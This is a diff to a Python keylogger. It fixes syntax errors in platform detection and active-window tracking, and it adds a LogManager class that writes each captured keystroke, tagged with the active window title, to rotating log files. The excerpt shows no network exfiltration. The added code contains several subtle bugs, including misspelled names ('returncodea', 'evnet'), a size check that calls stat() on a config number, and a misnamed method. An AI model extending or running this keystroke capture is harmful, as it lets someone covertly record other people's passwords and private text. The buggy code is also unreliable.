@@ -34,9 +34,9 @@ try:
 except ImportError:
     requests = None # type: ignore[assignment]
 
-WINDOWS = "Windows"
-DARWIN = "Darwin"
-LINUX = "Linux"
+WINDOWS = 'Windows'
+DARWIN = 'Darwin'
+LINUX = 'Linux'
 
 if platform.system() == WINDOWS:
     try:
@@ -44,8 +44,8 @@ if platform.system() == WINDOWS:
         import win32process
         import psutil
     except ImportError:
-        win32gui = None
-    elif platform.system() = DARWIN:
+            win32gui = None
+elif platform.system() == DARWIN:
     try:
         from AppKit import NSWorkspace
     except ImportError:
@@ -129,7 +129,7 @@ class KeyEvent:
         """
         time_str = self.timestamp.strftime("%Y-%m-%d %H:%M:%S")
         window = (
-            f"[{self.window_title}]" if self.window_title else: ""
+            f"[{self.window_title}]" if self.window_title else ""
         )
         return f"[{time_str}]{window} {self.key}"
 
@@ -188,14 +188,89 @@ class WindowTracker:
                     "getactivewindow",
                     "getwindowname",
                 ],
-                capture_output=True
-                text=True
-                timeout=1
-                check=False
+                capture_output=True,
+                text=True,
+                timeout=1,
+                check=False,
             )
             if result.returncodea == 0:
                 return result.stdout.strip()
             return None
         except Exception:
             return None
-        
+
+class LogManager:
+    """
+    File writer with automatic size-based rotation
+    """
+    def __init__(self, config: KeyloggerConfig):
+        self.config = config
+        config.log_dir.mkdir(
+            parents = True,
+            exist_ok = True,
+        )
+        self.current_log_path = (self._get_new_log_path())
+        self._lock = Lock()
+        self._file = open(
+            self.current_log_path,
+            'a',
+            encoding='utf-8',
+        )
+
+    def _get_new_log_path(self) -> Path:
+        """
+        Generate a new log file path with timestamp
+        """
+        ts = datetime.now().strftime("%Y%m%d_%H%M%S_%f")
+        name = (f"{self.config.log_file_prefix}_{ts}.txt")
+        return self.config.log_dir / name
+
+    def write_event(self, event: KeyEvent) -> None:
+        """
+        Write a keyboard event to the log file
+        """
+        with self._lock:
+            self._file.write(evnet.to_log_string() + '\n')
+            self._file.flush()
+            self._check_rotation()
+
+    def _check_rotation(self) -> None:
+        """
+        Rotate log file when size limit is reached
+        """
+        try:
+            size = (self.current_log_path.stat().st_size)
+        except FileNotFoundError:
+            self._rotate()
+            return
+
+        if (size / BYTES_PER_MB >= self.config.max_log_size_mb.stat().st_size):
+            self._rotate()
+
+    def _rotate(self) -> None:
+        """
+        Close current log file and open a new one
+        """
+        self._file.close()
+        self.current_log_path = (self._get_new_log_path())
+        self._file = open(
+            self.current_log_path,
+            'a',
+            encoding='utf-8',
+        )
+
+    def get_current_log_path(self) -> str:
+        """
+        Read and return the current log file content
+        """
+        with self._lock:
+            self._file.flush()
+            return self.current_log_path.read_text(encoding = 'utf-8')
+
+    def close(self) -> None:
+        """
+        Close the underlying file handle
+        """
+        with self._lock:
+            self._file.close()
+
